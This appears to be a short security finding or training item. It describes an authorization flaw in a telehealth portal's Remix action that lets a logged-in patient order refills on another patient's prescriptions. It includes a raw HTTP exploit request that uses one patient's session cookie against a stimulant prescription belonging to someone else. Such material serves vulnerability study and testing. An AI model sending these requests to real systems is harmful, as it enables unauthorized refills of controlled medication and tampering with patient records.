diagnosis: The Remix action server function orders medication refills based on prescriptionId from route parameters without checking if the prescription record belongs to patient.id. An attacker can trigger unauthorized medication refill requests on other patients' prescriptions.
exploit_request:
POST /prescriptions/rx_adderall_99210/refill HTTP/1.1
Host: portal.telehealth.com
Cookie: session_token=patient_b_cookie
Content-Type: application/json
